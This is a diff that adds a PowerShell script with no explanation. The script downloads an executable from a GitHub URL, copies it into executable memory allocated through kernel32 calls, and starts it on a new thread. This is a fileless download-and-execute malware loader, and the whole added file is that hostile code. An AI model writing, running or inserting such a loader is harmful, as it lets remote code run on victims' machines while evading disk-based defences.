@@ -1,0 +1,29 @@
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class PE {
+    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint alloc, uint prot);
+    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint tid);
+    [DllImport("kernel32")] public static extern void Sleep(uint ms);
+    [DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string name);
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr mod, string name);
+    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] d, uint s, out uint w);
+    [DllImport("kernel32")] public static extern IntPtr GetCurrentProcess();
+}
+"@
+$w = New-Object Net.WebClient
+$b = $w.DownloadData('https://raw.githubusercontent.com/OpheliaStowe3/drop-x/main/w.exe')
+if ($b[0] -ne 0x4D -or $b[1] -ne 0x5A) { exit }
+$peOff = [BitConverter]::ToInt32($b, 0x3C)
+$optOff = $peOff + 24
+$imgBase = [BitConverter]::ToUInt32($b, $optOff + 28)
+$imgSize = [BitConverter]::ToUInt32($b, $optOff + 56)
+$entry = [BitConverter]::ToUInt32($b, $optOff + 16)
+$mem = [PE]::VirtualAlloc([IntPtr]::Zero, $imgSize, 0x3000, 0x40)
+if ($mem -eq [IntPtr]::Zero) { exit }
+$written = 0
+[PE]::WriteProcessMemory([PE]::GetCurrentProcess(), $mem, $b, [uint32]$b.Length, [ref]$written)
+$ep = New-Object IntPtr ([Int64]$mem + $entry)
+$tid = 0
+$t = [PE]::CreateThread([IntPtr]::Zero, 0, $ep, [IntPtr]::Zero, 0, [ref]$tid)
+if ($t -ne [IntPtr]::Zero) { while($true) { [PE]::Sleep(30000) } }
